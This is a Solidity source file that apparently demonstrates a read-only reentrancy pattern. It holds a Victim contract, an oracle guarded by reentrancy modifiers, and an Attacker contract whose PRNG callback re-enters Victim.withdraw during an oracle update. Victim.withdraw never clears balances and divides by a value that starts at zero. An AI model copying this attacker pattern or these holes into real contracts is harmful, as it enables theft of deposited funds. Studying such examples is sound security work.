// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IPRNG {
    function getRandom() external returns (uint256);
}

contract Victim {
    Oracle_ree public o;
    mapping (address => uint) private balances;
    bool private flag;

    constructor(address _o) {
        o = Oracle_ree(_o);
    }

    function withdraw() external {
        uint256 bonus = o.getFix() / o.getRandomness();
        uint256 amt = balances[msg.sender] + bonus;

        (bool success, ) = payable(msg.sender).call{value: amt}("");
        require (success, "Failed");
    }

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }
}

// THIS is the contract vulnerable to reentrancy
contract Oracle_ree {
    uint256 private fix;
    uint256 private randomness;
    bool private flag;

    modifier nonReentrant() {
        require(!flag, "Locked");
        flag = true;
        _;
        flag = false;
    }

    modifier nonReentrantView() {
        require(!flag, "Locked");
        _;
    }

    function update(address prng, uint256 amt) nonReentrant external {
        uint rnd = IPRNG(prng).getRandom();
        fix += amt;
        randomness += amt + rnd;
    }

    function getFix() nonReentrantView view external returns (uint256) {
        return fix;
    }

    function getRandomness() nonReentrantView view external returns (uint256) {
        return randomness;
    }
}

contract Attacker is IPRNG {
    Victim public v;
    Oracle_ree public o;

    constructor(address payable _v, address _o) {
        v = Victim(_v);
        o = Oracle_ree(_o);
    }

    function attack() public payable {
        v.deposit{value:msg.value}();
        o.update(address(this), 10);
    }

    function getRandom() external returns (uint256) {
        v.withdraw();
        return 1;
    }

    receive() external payable {}
}